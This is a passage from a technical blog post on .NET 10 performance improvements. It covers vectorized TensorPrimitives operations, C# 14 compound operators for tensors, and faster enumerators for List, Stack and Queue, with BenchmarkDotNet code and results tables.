1000).Select(i =&gt; (float)i).ToArray(); private float[] _dest = new float[1000]; [Benchmark(Baseline = true)] public void DecrementManual() { ReadOnlySpan<float> src = _src; Span<float> dest = _dest; for (int i = 0; i &lt; src.Length; i++) { dest[i] = src[i] - 1f; } } [Benchmark] public void DecrementTP() =&gt; TensorPrimitives.Decrement(_src, _dest); }</float></float></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>DecrementManual</td> <td>288.80 ns</td> <td>1.00</td> </tr> <tr> <td>DecrementTP</td> <td>22.46 ns</td> <td>0.08</td> </tr> </tbody> </table><p>Wherever possible, these methods also utilize APIs on the underlying <code>Vector128</code>, <code>Vector256</code>, and <code>Vector512</code> types, including new corresponding methods introduced in <a href="https://github.com/dotnet/runtime/pull/111179">dotnet/runtime#111179</a> and <a href="https://github.com/dotnet/runtime/pull/115525">dotnet/runtime#115525</a>, such as <code>IsNaN</code>.</p><p>Existing methods are also improved. <a href="https://github.com/dotnet/runtime/pull/111615">dotnet/runtime#111615</a> from <a href="https://github.com/BarionLP">@BarionLP</a> improves <code>TensorPrimitives.SoftMax</code> by avoiding unnecessary recomputation of <code>T.Exp</code>. The softmax function involves computing <code>exp</code> for every element and summing them all together. The output for an element with value <code>x</code> is then the <code>exp(x)</code> divided by that sum. The previous implementation was following that outline, resulting in computing <code>exp</code> twice for each element. We can instead compute <code>exp</code> just once for each element, caching them temporarily in the destination while creating the sum, and then reusing those for the subsequent division, overwriting each with the actual result. The net result is close to doubling the throughput:</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net9.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Configs; using BenchmarkDotNet.Environments; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; using System.Numerics.Tensors; var config = DefaultConfig.Instance .AddJob(Job.Default.WithRuntime(CoreRuntime.Core90).WithNuGet("System.Numerics.Tensors", "9.0.9").AsBaseline()) .AddJob(Job.Default.WithRuntime(CoreRuntime.Core10_0).WithNuGet("System.Numerics.Tensors", "10.0.0-rc.1.25451.107")); BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args, config); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "NuGetReferences")] public partial class Tests { private float[] _src, _dst; [GlobalSetup] public void Setup() { Random r = new(42); _src = Enumerable.Range(0, 1000).Select(_ =&gt; r.NextSingle()).ToArray(); _dst = new float[_src.Length]; } [Benchmark] public void SoftMax() =&gt; TensorPrimitives.SoftMax(_src, _dst); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>SoftMax</td> <td>.NET 9.0</td> <td>1,047.9 ns</td> <td>1.00</td> </tr> <tr> <td>SoftMax</td> <td>.NET 10.0</td> <td>649.8 ns</td> <td>0.62</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/111505">dotnet/runtime#111505</a> from <a href="https://github.com/alexcovington">@alexcovington</a> enables <code>TensorPrimitives.Divide<t></t></code> to be vectorized for <code>int</code>. The operation already supported vectorization for <code>float</code> and <code>double</code>, for which there&rsquo;s SIMD hardware-accelerated support for division, but it didn&rsquo;t support <code>int</code>, which lacks SIMD hardware-accelerated support. This PR teaches the JIT how to emulate SIMD integer division, by converting the <code>int</code>s to <code>double</code>s, doing <code>double</code> division, and then converting back.</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net9.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Configs; using BenchmarkDotNet.Environments; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; using System.Numerics.Tensors; var config = DefaultConfig.Instance .AddJob(Job.Default.WithRuntime(CoreRuntime.Core90).WithNuGet("System.Numerics.Tensors", "9.0.9").AsBaseline()) .AddJob(Job.Default.WithRuntime(CoreRuntime.Core10_0).WithNuGet("System.Numerics.Tensors", "10.0.0-rc.1.25451.107")); BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args, config); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "NuGetReferences")] public partial class Tests { private int[] _n, _d, _dst; [GlobalSetup] public void Setup() { Random r = new(42); _n = Enumerable.Range(0, 1000).Select(_ =&gt; r.Next(1000, int.MaxValue)).ToArray(); _d = Enumerable.Range(0, 1000).Select(_ =&gt; r.Next(1, 1000)).ToArray(); _dst = new int[_n.Length]; } [Benchmark] public void Divide() =&gt; TensorPrimitives.Divide(_n, _d, _dst); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Divide</td> <td>.NET 9.0</td> <td>1,293.9 ns</td> <td>1.00</td> </tr> <tr> <td>Divide</td> <td>.NET 10.0</td> <td>458.4 ns</td> <td>0.35</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/116945">dotnet/runtime#116945</a> further updates <code>TensorPrimitives.Divide</code> (as well as <code>TensorPrimitives.Sign</code> and <code>TensorPrimitives.ConvertToInteger</code>) to be vectorizable when used with <code>nint</code> or <code>nuint</code>. <code>nint</code> can be treated identically to <code>int</code> when in a 32-bit process and to <code>long</code> when in a 64-bit process; same for <code>nuint</code> with <code>uint</code> and <code>ulong</code>, respectively. So anywhere we&rsquo;re successfully vectorizing for <code>int</code>/<code>uint</code> on 32-bit or <code>long</code>/<code>ulong</code> on 64-bit, we can also successfully vectorize for <code>nint</code>/<code>nuint</code>. <a href="https://github.com/dotnet/runtime/pull/116895">dotnet/runtime#116895</a> also enables vectorizing <code>TensorPrimitives.ConvertTruncating</code> when used to convert <code>float</code> to <code>int</code> or <code>uint</code> and <code>double</code> to <code>long</code> or <code>ulong</code>. Vectorization hadn&rsquo;t previously been enabled because the underlying operations used had some undefined behavior; that behavior was fixed late in the .NET 9 cycle, such that this vectorization can now be enabled.</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net9.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Configs; using BenchmarkDotNet.Environments; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; using System.Numerics.Tensors; var config = DefaultConfig.Instance .AddJob(Job.Default.WithRuntime(CoreRuntime.Core90).WithNuGet("System.Numerics.Tensors", "9.0.9").AsBaseline()) .AddJob(Job.Default.WithRuntime(CoreRuntime.Core10_0).WithNuGet("System.Numerics.Tensors", "10.0.0-rc.1.25451.107")); BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args, config); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "NuGetReferences")] public partial class Tests { private float[] _src; private int[] _dst; [GlobalSetup] public void Setup() { Random r = new(42); _src = Enumerable.Range(0, 1000).Select(_ =&gt; r.NextSingle() * 1000).ToArray(); _dst = new int[_src.Length]; } [Benchmark] public void ConvertTruncating() =&gt; TensorPrimitives.ConvertTruncating(_src, _dst); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>ConvertTruncating</td> <td>.NET 9.0</td> <td>933.86 ns</td> <td>1.00</td> </tr> <tr> <td>ConvertTruncating</td> <td>.NET 10.0</td> <td>41.99 ns</td> <td>0.04</td> </tr> </tbody> </table><p>Not to be left out, <code>TensorPrimitives.LeadingZeroCount</code> is also improved in <a href="https://github.com/dotnet/runtime/pull/110333">dotnet/runtime#110333</a> from <a href="https://github.com/alexcovington">@alexcovington</a>. When AVX512 is available, the change utilizes AVX512 instructions like <code>PermuteVar16x8x2</code> to vectorize <code>LeadingZeroCount</code> for all types supported by <code>Vector512<t></t></code>.</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net9.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Configs; using BenchmarkDotNet.Environments; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; using System.Numerics.Tensors; var config = DefaultConfig.Instance .AddJob(Job.Default.WithRuntime(CoreRuntime.Core90).WithNuGet("System.Numerics.Tensors", "9.0.9").AsBaseline()) .AddJob(Job.Default.WithRuntime(CoreRuntime.Core10_0).WithNuGet("System.Numerics.Tensors", "10.0.0-rc.1.25451.107")); BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args, config); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "NuGetReferences")] public partial class Tests { private byte[] _src, _dst; [GlobalSetup] public void Setup() { _src = new byte[1000]; _dst = new byte[_src.Length]; new Random(42).NextBytes(_src); } [Benchmark] public void LeadingZeroCount() =&gt; TensorPrimitives.LeadingZeroCount(_src, _dst); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>LeadingZeroCount</td> <td>.NET 9.0</td> <td>401.60 ns</td> <td>1.00</td> </tr> <tr> <td>LeadingZeroCount</td> <td>.NET 10.0</td> <td>12.33 ns</td> <td>0.03</td> </tr> </tbody> </table><p>In terms of changes that affected the most operations, <a href="https://github.com/dotnet/runtime/pull/116898">dotnet/runtime#116898</a> and <a href="https://github.com/dotnet/runtime/pull/116934">dotnet/runtime#116934</a> take the cake. Together, these PRs extend vectorization for almost 60 distinct operations to also accelerate for <code>Half</code>: <code>Abs</code>, <code>Add</code>, <code>AddMultiply</code>, <code>BitwiseAnd</code>, <code>BitwiseOr</code>, <code>Ceiling</code>, <code>Clamp</code>, <code>CopySign</code>, <code>Cos</code>, <code>CosPi</code>, <code>Cosh</code>, <code>CosineSimilarity</code>, <code>Decrement</code>, <code>DegreesToRadians</code>, <code>Divide</code>, <code>Exp</code>, <code>Exp10</code>, <code>Exp10M1</code>, <code>Exp2</code>, <code>Exp2M1</code>, <code>ExpM1</code>, <code>Floor</code>, <code>FusedAddMultiply</code>, <code>Hypot</code>, <code>Increment</code>, <code>Lerp</code>, <code>Log</code>, <code>Log10</code>, <code>Log10P1</code>, <code>Log2</code>, <code>Log2P1</code>, <code>LogP1</code>, <code>Max</code>, <code>MaxMagnitude</code>, <code>MaxMagnitudeNumber</code>, <code>MaxNumber</code>, <code>Min</code>, <code>MinMagnitude</code>, <code>MinMagnitudeNumber</code>, <code>MinNumber</code>, <code>Multiply</code>, <code>MultiplyAdd</code>, <code>MultiplyAddEstimate</code>, <code>Negate</code>, <code>OnesComplement</code>, <code>Reciprocal</code>, <code>Remainder</code>, <code>Round</code>, <code>Sigmoid</code>, <code>Sin</code>, <code>SinPi</code>, <code>Sinh</code>, <code>Sqrt</code>, <code>Subtract</code>, <code>Tan</code>, <code>TanPi</code>, <code>Tanh</code>, <code>Truncate</code>, and <code>Xor</code>. The challenge here is that <code>Half</code> doesn&rsquo;t have accelerated hardware support, and today is not even supported by the vector types. In fact, even for its scalar operations, <code>Half</code> is manipulated internally by converting it to a <code>float</code>, performing the relevant operation as <code>float</code>, and then casting back, e.g. here&rsquo;s the implementation of the <code>Half</code> multiplication operator:</p><pre><code>public static Half operator *(Half left, Half right) =&gt; (Half)((float)left * (float)right);</code></pre><p>For all of these <code>TensorPrimitives</code> operations, they previously would treat <code>Half</code> like any other unaccelerated type, and would just run a scalar loop that performed the operation on each <code>Half</code>. That means for each element, we&rsquo;re converting it to <code>float</code>, then performing the operation, and then converting it back. As luck would have it, though, <code>TensorPrimitives</code> already defines the <code>ConvertToSingle</code> and <code>ConvertToHalf</code> methods, which are accelerated. We can then reuse those methods to do the same thing that&rsquo;s already done for scalar operations but do it vectorized: take a vector of <code>Half</code>s, convert them all to <code>float</code>s, process all the <code>float</code>s, and convert them all back to <code>Half</code>s. Of course, I already stated that the vector types don&rsquo;t support <code>Half</code>, so how can we &ldquo;take a vector of <code>Half</code>&ldquo;? By reinterpret casting the <code>Span<half></half></code> to <code>Span<short></short></code> (or <code>Span<ushort></ushort></code>), which allows us to smuggle the <code>Half</code>s through. And, as it turns out, even for scalar, the very first thing <code>Half</code>&lsquo;s <code>float</code> cast operator does is convert it to a <code>short</code>.</p><p>The net result is that a ton of operations can now be accelerated for <code>Half</code>.</p><pre><code>// Update benchmark.csproj with a package reference to System.Numerics.Tensors. // dotnet run -c Release -f net9.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Configs; using BenchmarkDotNet.Environments; using BenchmarkDotNet.Jobs; using BenchmarkDotNet.Running; using System.Numerics.Tensors; var config = DefaultConfig.Instance .AddJob(Job.Default.WithRuntime(CoreRuntime.Core90).WithNuGet("System.Numerics.Tensors", "9.0.9").AsBaseline()) .AddJob(Job.Default.WithRuntime(CoreRuntime.Core10_0).WithNuGet("System.Numerics.Tensors", "10.0.0-rc.1.25451.107")); BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args, config); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "NuGetReferences")] public partial class Tests { private Half[] _x, _y, _dest; [GlobalSetup] public void Setup() { _x = new Half[1000]; _y = new Half[_x.Length]; _dest = new Half[_x.Length]; var random = new Random(42); for (int i = 0; i &lt; _x.Length; i++) { _x[i] = (Half)random.NextSingle(); _y[i] = (Half)random.NextSingle(); } } [Benchmark] public void Add() =&gt; TensorPrimitives.Add(_x, _y, _dest); }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Add</td> <td>.NET 9.0</td> <td>5,984.3 ns</td> <td>1.00</td> </tr> <tr> <td>Add</td> <td>.NET 10.0</td> <td>481.7 ns</td> <td>0.08</td> </tr> </tbody> </table><p>The <code>System.Numerics.Tensors</code> library in .NET 10 now also includes stable APIs for tensor types (which use <code>TensorPrimitives</code> in their implementations). This includes a <code>Tensor<t></t></code>, <code>ITensor&lt;,&gt;</code>, <code>TensorSpan<t></t></code>, and <code>ReadOnlyTensorSpan<t></t></code>. One of the really interesting things about these types is that they take advantage of the new C# 14 compound operators feature, and do so for a significant performance benefit. In previous versions of C#, you&rsquo;re able to write custom operators, for example an addition operator:</p><pre><code>public class C { public int Value; public static C operator +(C left, C right) =&gt; new() { Value = left.Value + right.Value }; }</code></pre><p>With that type, I can write code like:</p><pre><code>C a = new() { Value = 42 }; C b = new() { Value = 84 }; C c = a + b; Console.WriteLine(c.Value);</code></pre><p>which will print out <code>126</code>. I can also change the code to use a compound operator, <code>+=</code>, like this:</p><pre><code>C a = new() { Value = 42 }; C b = new() { Value = 84 }; a += b; Console.WriteLine(a.Value);</code></pre><p>which will also print out <code>126</code>, because the <code>a += b</code> is always identical to <code>a = a + b</code>&hellip; or, at least it was. Now with C# 14, it&rsquo;s possible for a type to not only define a <code>+</code> operator, it can also define a <code>+=</code> operator. If a type defines a <code>+=</code> operator, it will be used rather than expanding <code>a += b</code> as shorthand for <code>a = a + b</code>. And that has performance ramifications.</p><p>A tensor is basically a multidimensional array, and as with arrays, these can be big&hellip; really big. If I have a sequence of operations:</p><pre><code>Tensor<int> t1 = ...; Tensor<int> t2 = ...; for (int i = 0; i &lt; 3; i++) { t1 += t2; }</int></int></code></pre><p>and each of those <code>t1 += t2</code>s exands into <code>t1 = t1 + t2</code>, then for each I&rsquo;m allocating a brand new tensor. If they&rsquo;re big, that gets expensive right quick. But C# 14&rsquo;s new user-defined compound operators, as initially added to the compiler in <a href="https://github.com/dotnet/roslyn/pull/78400">dotnet/roslyn#78400</a>, enable mutation of the target.</p><pre><code>public class C { public int Value; public static C operator +(C left, C right) =&gt; new() { Value = left.Value + right.Value }; public static void operator +=(C other) =&gt; left.Value += other.Value; }</code></pre><p>And that means that such compound operators on the tensor types can just update the target tensor in place rather than allocating a whole new (possibly very large) data structure for each computation. <a href="https://github.com/dotnet/runtime/pull/117997">dotnet/runtime#117997</a> adds all of these compound operators for the tensor types. (Not only are these using C# 14 user-defined compound operators, they&rsquo;re doing so as extension operators, using the new C# 14 extension types feature. Fun!)</p><h2>Collections</h2><p>Handling collections of data is the lifeblood of any application, and as such every .NET release tries to eke out even more performance from collections and collection processing.</p><h3>Enumeration</h3><p>Iterating through collections is one of the most common things developers do. To make this as efficient as possible, the most prominent collection types in .NET (e.g. <code>List<t></t></code>) expose struct-based enumerators (e.g. <code>List<t>.Enumerator</t></code>) which their public <code>GetEnumerator()</code> methods then return in a strongly-typed manner:</p><pre><code>public Enumerator GetEnumerator() =&gt; new Enumerator(this);</code></pre><p>This is in addition to their <code>IEnumerable<t>.GetEnumerator()</t></code> implementation, which ends up being implemented via an &ldquo;explicit&rdquo; interface implementation (&ldquo;explicit&rdquo; means the relevant method provides the interface method implementation but does not show up as a public method on the type itself), e.g. <code>List<t></t></code>&lsquo;s implementation:</p><pre><code>IEnumerator<t> IEnumerable<t>.GetEnumerator() =&gt; Count == 0 ? SZGenericArrayEnumerator<t>.Empty : GetEnumerator();</t></t></t></code></pre><p>Directly <code>foreach</code>&lsquo;ing over the collection allows the C# compiler to bind to the struct-based enumerator, enabling avoiding the enumerator allocation and being able to directly see the non-virtual methods on the enumerator, rather than working with an <code>IEnumerator<t></t></code> and the interface dispatch required to invoke methods on it. That, however, falls apart once the collection is used polymorphically as an <code>IEnumerable<t></t></code>; at that point, the <code>IEnumerable<t>.GetEnumerator()</t></code> is used, which is forced to allocate a new enumerator instance (except for special-cases, such as how <code>List<t></t></code>&lsquo;s implementation shown above returns a singleton enumerator when the collection is empty).</p><p>Thankfully, as noted earlier in the JIT section, the JIT has been gaining super powers around dynamic PGO, escape analysis, and stack allocation. This means that in many situations, the JIT is now able to see that the most common concrete type for a given call site is a specific enumerator type and generate code specific to when it is that type, devirtualizing the calls, possibly inlining them, and then, if it&rsquo;s able to do so sufficiently, stack allocating the enumerator. With the progress that&rsquo;s been made in .NET 10, this now happens very frequently for arrays and <code>List<t></t></code>. While the JIT is able to do this in general regardless of an object&rsquo;s type, the ubiquity of enumeration makes it all that much more important for <code>IEnumerator<t></t></code>, so <a href="https://github.com/dotnet/runtime/pull/116978">dotnet/runtime#116978</a> marks <code>IEnumerator<t></t></code> as an <code>[Intrinsic]</code>, giving the JIT the ability to better reason about it.</p><p>However, some enumerators still needed a bit of help. Besides <code>T[]</code>, <code>List<t></t></code> is the most popular collection type in .NET, and with the JIT changes, many <code>foreach</code>s of an <code>IEnumerable<t></t></code> that are actually <code>List<t></t></code> will successfully have the enumerator stack allocated. Awesome. That awesomeness dwindled, however, when trying out different sized lists. This is a benchmark that tests out enumerating a <code>List<t></t></code> typed as <code>IEnumerable<t></t></code>, with different lengths, along with benchmark results from early August 2025 (around .NET 10 Preview 7).</p><pre><code>// dotnet run -c Release -f net10.0 --filter ** using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private IEnumerable<int> _enumerable; [Params(500, 5000, 15000)] public int Count { get; set; } [GlobalSetup] public void Setup() =&gt; _enumerable = Enumerable.Range(0, Count).ToList(); [Benchmark] public int Sum() { int sum = 0; foreach (int item in _enumerable) sum += item; return sum; } }</int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Count</th> <th>Mean</th> <th>Allocated</th> </tr> </thead> <tbody> <tr> <td>Sum</td> <td>500</td> <td>214.1 ns</td> <td>&ndash;</td> </tr> <tr> <td>Sum</td> <td>5000</td> <td>4,767.1 ns</td> <td>40 B</td> </tr> <tr> <td>Sum</td> <td>15000</td> <td>13,824.4 ns</td> <td>40 B</td> </tr> </tbody> </table><p>Note that for the <code>500</code> element <code>List<t></t></code>, the allocation column shows that nothing was allocated on the heap, as the enumerator was successfully stack allocated. Fabulous. But then just increasing the size of the list caused it to no longer be stack-allocated. Why? The reason for the allocation in the jump from <code>500</code> to <code>5000</code> has to do with dynamic PGO combined with how <code>List<t></t></code>&lsquo;s enumerator was written oh so many years ago.</p><p><code>List<t></t></code>&lsquo;s enumerator&rsquo;s <code>MoveNext</code> was structured like this:</p><pre><code>public bool MoveNext() { if (_version == _list._version &amp;&amp; ((uint)_index &lt; (uint)_list._size)) { ... // handle successfully getting next element return true; } return MoveNextRare(); } private bool MoveNextRare() { ... // handle version mismatch and/or returning false for completed enumeration }</code></pre><p>The <code>Rare</code> in the name gives a hint as to why it&rsquo;s split like this. The <code>MoveNext</code> method was kept as thin as possible for the common case of invoking <code>MoveNext</code>, namely all successful calls that return <code>true</code>; the only time <code>MoveNextRare</code> is needed, other than when the enumerator is misused, is for the final call to it after all elements have been yielded. That streamlining of <code>MoveNext</code> itself was done to make <code>MoveNext</code> inlineable. However, a lot has changed since this code was written, making it less important, and the separating out of <code>MoveNextRare</code> has a really interesting interaction with dynamic PGO. One of the things dynamic PGO looks for is whether code is considered hot (used a lot) or cold (used rarely), and that data influences whether a method should be considered for inlining. For shorter lists, dynamic PGO will see <code>MoveNextRare</code> invoked a reasonable number of times, and will consider it for inlining. And if all of the calls to the enumerator are inlined, the enumerator instance can avoid escaping the call frame, and can then be stack allocated. But once the list length grows to a much larger amount, that <code>MoveNextRare</code> method will start to look really cold, will struggle to be inlined, and will then allow the enumerator instance to escape, preventing it from being stack allocated. <a href="https://github.com/dotnet/runtime/pull/118425">dotnet/runtime#118425</a> recognizes that times have changed since this enumerator was written, with many changes to inlining heuristics and PGO and the like; it undoes the separating out of <code>MoveNextRare</code> and simplifies the enumerator. With how the system works today, the re-combined <code>MoveNext</code> is still inlineable, with or without PGO, and we&rsquo;re able to stack allocate at the larger size.</p><table> <thead> <tr> <th>Method</th> <th>Count</th> <th>Mean</th> <th>Allocated</th> </tr> </thead> <tbody> <tr> <td>Sum</td> <td>500</td> <td>221.2 ns</td> <td>&ndash;</td> </tr> <tr> <td>Sum</td> <td>5000</td> <td>2,153.6 ns</td> <td>&ndash;</td> </tr> <tr> <td>Sum</td> <td>15000</td> <td>14,724.9 ns</td> <td>40 B</td> </tr> </tbody> </table><p>With that fix, we still had an issue, though. We&rsquo;re now avoiding the allocation at lengths 500 and 5000, but at 15,000 we still see the enumerator being allocated. Now why? This has to do with <a href="https://devblogs.microsoft.com/dotnet/performance_improvements_in_net_7/#on-stack-replacement">OSR (on-stack replacement)</a>, which was introduced in .NET 7 as a key enabler for allowing tiered compilation to be used with methods containing loops. OSR allows for a method to be recompiled with optimizations even while it&rsquo;s executing, and for an invocation of the method to jump from the unoptimized code for the method to the corresponding location in the newly optimized method. While OSR is awesome, it unfortunately causes some complications here. Once the list gets long enough, an invocation of the tier 0 (unoptimized) method will transition to the OSR optimized method&hellip; but OSR methods don&rsquo;t contain dynamic PGO instrumentation (they used to, but it was removed because it led to problems if the instrumented code never got recompiled again and thus suffered regressions due to forever-more running with the instrumentation probes in place). Without the instrumentation, and in particular without the instrumentation for the tail portion of the method (where the enumerator&rsquo;s <code>Dispose</code> method is invoked), even though <code>List<t>.Dispose</t></code> is a nop, the JIT may not be able to do the guarded devirtualization that enables the <code>IEnumerator<t>.Dispose</t></code> to be devirtualized and inlined. Meaning, ironically, that the nop <code>Dispose</code> causes escape analysis to see the enumerator instance escape, such that it can&rsquo;t be stack allocated. Whew.</p><p>Thankfully, <a href="https://github.com/dotnet/runtime/pull/118461">dotnet/runtime#118461</a> addresses that in the JIT. Specifically for enumerators, this PR enables dynamic PGO to infer the missing instrumentation based on the earlier probes used with the other enumerator methods, which then enables it to successfully devirtualize and inline <code>Dispose</code>. So, for .NET 10, and the same benchmark, we end up with this lovely sight:</p><table> <thead> <tr> <th>Method</th> <th>Count</th> <th>Mean</th> <th>Allocated</th> </tr> </thead> <tbody> <tr> <td>Sum</td> <td>500</td> <td>216.5 ns</td> <td>&ndash;</td> </tr> <tr> <td>Sum</td> <td>5000</td> <td>2,082.4 ns</td> <td>&ndash;</td> </tr> <tr> <td>Sum</td> <td>15000</td> <td>6,525.3 ns</td> <td>&ndash;</td> </tr> </tbody> </table><p>Other types needed a bit of help as well. <a href="https://github.com/dotnet/runtime/pull/118467">dotnet/runtime#118467</a> addresses <code>PriorityQueue<telement></telement></code>&lsquo;s enumerator; it&rsquo;s enumerator was a port of <code>List<t></t></code>&lsquo;s and so was changed similarly.</p><p>Separately, <a href="https://github.com/dotnet/runtime/pull/117328">dotnet/runtime#117328</a> streamline&rsquo;s <code>Stack<t></t></code>&lsquo;s enumerator type, removing around half the lines of code that previously composed it. The previous enumerator&rsquo;s <code>MoveNext</code> incurred five branches on the way to grabbing most next elements:</p><ul> <li>It first did a version check, comparing the stack&rsquo;s version number against the enumerator&rsquo;s captured version number, to ensure the stack hadn&rsquo;t been mutated since the time the enumerator was grabbed.</li> <li>It then checked to see whether this was the first call to the enumerator, taking one path that lazily-initialized some state if it was and another path assuming already-initialized state if not.</li> <li>Assuming this wasn&rsquo;t the first call, it then checked whether enumeration had previously ended.</li> <li>Assuming it hadn&rsquo;t, it then checked whether there&rsquo;s anything left to enumerate.</li> <li>And finally, it dereferenced the underlying array, incurring a bounds check.</li> </ul><p>The new implementation cuts that in half. It relies on the enumerator&rsquo;s constructor initializing the current index to the length of the stack, such that each <code>MoveNext</code> call just decrements this value. When the data is exhausted, the count will go negative. This means that we can combine a whole bunch of these checks into a single check:</p><pre><code>if ((uint)index &lt; (uint)array.Length)</code></pre><p>and we&rsquo;re left with just two branches on the way to reading any element: the version check and whether the index is in bounds. That reduction not only means there&rsquo;s less code to process and fewer branches that might be improperly predicted, it also shrinks the size of the members to the point where they&rsquo;re much more likely to be inlined, which in turns makes it much more likely that the enumerator object can be stack allocated.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Stack<int> _direct = new Stack<int>(Enumerable.Range(0, 10)); private IEnumerable<int> _enumerable = new Stack<int>(Enumerable.Range(0, 10)); [Benchmark] public int SumDirect() { int sum = 0; foreach (int item in _direct) sum += item; return sum; } [Benchmark] public int SumEnumerable() { int sum = 0; foreach (int item in _enumerable) sum += item; return sum; } }</int></int></int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Code Size</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>SumDirect</td> <td>.NET 9.0</td> <td>23.317 ns</td> <td>1.00</td> <td>331 B</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td>SumDirect</td> <td>.NET 10.0</td> <td>4.502 ns</td> <td>0.19</td> <td>55 B</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>SumEnumerable</td> <td>.NET 9.0</td> <td>30.893 ns</td> <td>1.00</td> <td>642 B</td> <td>40 B</td> <td>1.00</td> </tr> <tr> <td>SumEnumerable</td> <td>.NET 10.0</td> <td>7.906 ns</td> <td>0.26</td> <td>381 B</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p><a href="https://github.com/dotnet/runtime/pull/117341">dotnet/runtime#117341</a> does something similar but for <code>Queue<t></t></code>. <code>Queue<t></t></code> has an interesting complication when compared to <code>Stack<t></t></code>, which is that it can wrap around the length of the underlying array. Whereas with <code>Stack<t></t></code>, we can always start at a particular index and just count down to 0, using that index as the offset into the array, with <code>Queue<t></t></code>, the starting index can be anywhere in the array, and when walking from that index to the last element, we might need to wrap around back to the beginning. Such wrapping can be accomplished using <code>% array.Length</code> (which is what <code>Queue<t></t></code> does on .NET Framework), but such a division operation can be relatively costly. An alternative, since we know the count can never be more than the array&rsquo;s length, is to check whether we&rsquo;ve already walked past the end of the array, and if we have, then subtract the array&rsquo;s length to get to the corresponding location from the start of the array. The existing implementation in .NET 9 did just that:</p><pre><code>if (index &gt;= array.Length) { index -= array.Length; // wrap around if needed } _currentElement = array[index];</code></pre><p>That is two branches, one for the check against the array length, and one for the bounds check. The bounds check can&rsquo;t be eliminated here because the JIT hasn&rsquo;t seen proof that the index is actually in-bounds and thus needs to be defensive. Instead, we can write it like this:</p><pre><code>if ((uint)index &lt; (uint)array.Length) { _currentElement = array[index]; } else { index -= array.Length; _currentElement = array[index]; }</code></pre><p>An enumeration of a queue can logically be split into two parts: the elements from the head index to the end of the array, and the elements from the beginning of the array to the tail. All of the former now fall into the first block, which incurs only one branch because the JIT can use the knowledge gleaned from the comparison to eliminate the bounds check. It only incurs a bounds check when in the second portion of the enumeration.</p><p>We can more easily visualize the branch savings by using benchmarkdotnet&rsquo;s <code>HardwareCounters</code> diagnoser, asking it to track <code>HardwareCounter.BranchInstructions</code> (this diagnoser only works on Windows). Note here, as well, that the changes not only improve throughput, they also enable the boxed enumerator to be stack allocated.</p><pre><code>// This benchmark was run on Windows for the HardwareCounters diagnoser to work. // dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using BenchmarkDotNet.Diagnosers; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HardwareCounters(HardwareCounter.BranchInstructions)] [MemoryDiagnoser(displayGenColumns: false)] [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Queue<int> _direct; private IEnumerable<int> _enumerable; [GlobalSetup] public void Setup() { _direct = new 